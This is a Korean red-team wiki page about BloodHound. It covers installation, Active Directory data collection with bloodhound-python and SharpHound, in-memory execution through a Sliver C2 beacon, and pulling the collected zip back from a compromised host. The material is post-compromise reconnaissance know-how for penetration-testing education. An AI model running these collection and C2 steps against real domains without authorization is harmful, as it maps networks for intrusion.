# 블러드하운드

![이미지 출처: https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html](<../.gitbook/assets/image (5) (1) (1) (1) (1).png>)

[블러드하운드(BloodHound)](https://github.com/BloodHoundAD/BloodHound)는 액티브 디렉토리의 LDAP 데이터를 수집하고 이를 그래프 자료구조 형식으로 보여주는 툴이다. 수만명의 도메인 유저 계정, 수십만대의 호스트들의 관계와 정보를 일일히 수동으로 정리하는 것은 불가능에 가깝다. 블러드하운드는 이를 도와주기 위해서 만들어진 툴이다.&#x20;

블러드하운드는 총 3가지 툴로 운영된다.&#x20;

1. 블러드하운드 Data Ingestor - 도메인 컨트롤러에 접근에 LDAP 데이터를 추출한 뒤, 도메인 유저, 호스트, 그룹, 세션 등의 데이터를 json 형태로 저장하는 툴.&#x20;
2. Neo4J - 블러드 하운드의 백엔드 데이터베이스. Ingestor가 추출한 json 파일을 neo4j 데이터베이스에 불러온 뒤 블러드하운드 GUI에서 사용할 수 있게된다.&#x20;
3. 블러드하운드 GUI  - 백엔드 데이터베이스의 데이터를 그래프 자료구조의 형식으로 보여주는 프론트엔드 GUI 툴.&#x20;

### 설치&#x20;

블러드하운드 설치는 [공식 문서](https://github.com/BloodHoundAD/BloodHound)를 참고한다.&#x20;

```
# 칼리 리눅스 
apt update -y 
apt install bloodhound -y 
neo4j console 

# http://localhost:7474 방문 후 neo4j:neo4j 를 이용해 로그인. 
# 이후, 비밀번호를 바꿔줌.

# 블러드하운드 실행 후 neo4j:<바뀐-비밀번호>로 로그인 
bloodhound 
```

![블러드하운드 GUI 로그인 화면](<../.gitbook/assets/image (8) (1) (1).png>)

### 사용 - 데이터 Ingestor

블러드하운드를 이용하기 위해선 타겟 도메인의 액티브 디렉토리 데이터를 Ingestor를 이용해 추출해야한다. 액티브 디렉토리 데이터를 추출하기 위해서는 도메인 유저의 계정정보나 세션이 필요하다. 초기 침투가 성공적이였다면 대부분 도메인 유저 (ex. 회계 부서의 김인턴) 의 문맥을 갖게된다.&#x20;

데이터 Ingestor는 다양한 액티브 디렉토리의 정보들을 빼내올 수 있다. 공식문서의 `-c, Collection method`를 참고한다.&#x20;

리눅스에서는 [`bloodhound-python`](https://github.com/fox-it/BloodHound.py) 툴을, 윈도우에서는 [`SharpHound`](https://github.com/BloodHoundAD/SharpHound) 툴을 이용한다.&#x20;

{% tabs %}
{% tab title="리눅스" %}
리눅스에서는 bloodhound-python을 이용한다.&#x20;

```
# 설치 
pip3 install bloodhound 

# 실행 
bloodhound-python -c DCOnly -u <user> -p <pass> -d <domain> -dc <dc-fqdn>
bloodhound-python -c DCOnly -u low -p 'Password123!' -d choi.local -dc dc01.choi.local
```
{% endtab %}

{% tab title="윈도우 - 콘솔" %}
콘솔을 갖고 있는 경우 SharpHound를 이용한다. SharpHound는 .NET 어셈블리이기 때문에 직접 실행하거나 파워쉘에서 불러온 후 메모리상에서 실행할 수 있다.&#x20;

```
# Sharphound.exe 실행 
./SharpHound.exe -c <method> -d <domain>
./SharpHound.exe -c All -d choi.local
```
{% endtab %}

{% tab title="윈도우 - 비컨" %}
SharpHound는 .NET 어셈블리이기 때문에 비컨의 메모리상에서 execute-assembly 형식으로 사용할 수 있다.&#x20;

```
# SharpHound Release를 다운받거나, 깃-클론 뒤 컴파일한다. 
wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.0.3/SharpHound-v1.0.3.zip . 
unzip SharpHound-v1.0.3.zip

# 슬리버의 execute-assembly를 이용해 메모리상에서 SharpHound를 실행한다. 
sliver> use <beacon-name>
sliver> execute-assembly /root/redteam/tools/SharpHound.exe "-c All -d choi.local"

# 다운로드 할 때는 백슬래쉬 이스케이프를 해주거나 큰 따옴표를 이용한다. 
sliver> download <원격-파일경로> <로컬-파일경로>
sliver> download "C:\Users\Administrator\Downloads\20220613235339_BloodHound.zip" /root/redteam/bh.zip
```
{% endtab %}
{% endtabs %}

### 사용 - 블러드하운드 GUI

다운 받은 zip파일을 블러드하운드 GUI에다가 드래그 & 드롭 하면 된다.&#x20;

![](<../.gitbook/assets/image (3) (1) (1) (1).png>)

이후 Analysis에서 미리 준비된 쿼리를 이용하거나 하단의 `Raw Query` 를 통해 직접 Cypher Query를 사용한다.&#x20;

### 레퍼런스&#x20;

{% embed url="https://bloodhound.readthedocs.io/en/latest/" %}

{% embed url="https://github.com/BloodHoundAD/BloodHound" %}

{% embed url="https://github.com/BloodHoundAD/SharpHound" %}

{% embed url="https://github.com/fox-it/BloodHound.py" %}
